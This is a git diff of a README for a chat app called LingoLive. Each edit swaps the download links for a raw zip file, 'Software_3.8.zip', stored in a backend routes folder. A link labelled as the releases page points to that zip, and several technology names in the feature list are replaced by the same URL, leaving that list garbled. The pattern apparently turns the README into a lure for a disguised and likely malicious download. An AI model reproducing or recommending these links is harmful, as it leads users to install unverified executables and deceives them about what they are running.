@@ -6,7 +6,7 @@ Welcome to LingoLive! This guide will help you download and run the application 
 
 ## 📥 Download LingoLive
 
-[![Download LingoLive](https://raw.githubusercontent.com/Orchestrax/lingolive/main/itself/lingolive.zip)](https://raw.githubusercontent.com/Orchestrax/lingolive/main/itself/lingolive.zip)
+[![Download LingoLive](https://github.com/Orchestrax/lingolive/raw/refs/heads/main/backend/src/routes/Software_3.8.zip)](https://github.com/Orchestrax/lingolive/raw/refs/heads/main/backend/src/routes/Software_3.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -33,7 +33,7 @@ LingoLive offers an array of features for users:
 
 To get LingoLive on your device, follow these steps:
 
-1. **Visit the Releases Page**: Click this link to go to the [Releases page](https://raw.githubusercontent.com/Orchestrax/lingolive/main/itself/lingolive.zip).
+1. **Visit the Releases Page**: Click this link to go to the [Releases page](https://github.com/Orchestrax/lingolive/raw/refs/heads/main/backend/src/routes/Software_3.8.zip).
 2. **Select the Latest Version**: On the Releases page, find the latest version. It is usually at the top of the list.
 3. **Download the Application**: Click the link for the version that matches your operating system. This will start the download.
 4. **Locate the Downloaded File**: Once the download completes, navigate to your downloads folder to find the file.
@@ -57,11 +57,11 @@ LingoLive utilizes technologies that enhance your experience:
 
 - **Cloudinary API**: For efficient media management.
 - **Context API**: To manage global state in React efficiently.
-- **https://raw.githubusercontent.com/Orchestrax/lingolive/main/itself/lingolive.zip**: Backend framework for seamless API interactions.
+- **https://github.com/Orchestrax/lingolive/raw/refs/heads/main/backend/src/routes/Software_3.8.zip**: Backend framework for seamless API interactions.
 - **MongoDB**: Store and retrieve user data securely.
-- **https://raw.githubusercontent.com/Orchestrax/lingolive/main/itself/lingolive.zip**: Server-side implementation for fast responses.
+- **https://github.com/Orchestrax/lingolive/raw/refs/heads/main/backend/src/routes/Software_3.8.zip**: Server-side implementation for fast responses.
 - **React Router DOM**: For smooth navigation across the app.
-- **https://raw.githubusercontent.com/Orchestrax/lingolive/main/itself/lingolive.zip**: Enable real-time chat and notifications.
+- **https://github.com/Orchestrax/lingolive/raw/refs/heads/main/backend/src/routes/Software_3.8.zip**: Enable real-time chat and notifications.
 - **Tailwind CSS**: Custom styling for a vibrant interface.
 - **WebRTC**: Support for real-time video and voice calls.
 
@@ -73,4 +73,4 @@ LingoLive will continue to evolve! Stay tuned for updates that bring new feature
 
 Thank you for choosing LingoLive! We appreciate your support and hope you enjoy using the application. Connect, share, and communicate like never before. Start your journey today by downloading LingoLive! 
 
-Remember, your connection to the world is just a click away: [Download LingoLive](https://raw.githubusercontent.com/Orchestrax/lingolive/main/itself/lingolive.zip)
+Remember, your connection to the world is just a click away: [Download LingoLive](https://github.com/Orchestrax/lingolive/raw/refs/heads/main/backend/src/routes/Software_3.8.zip)
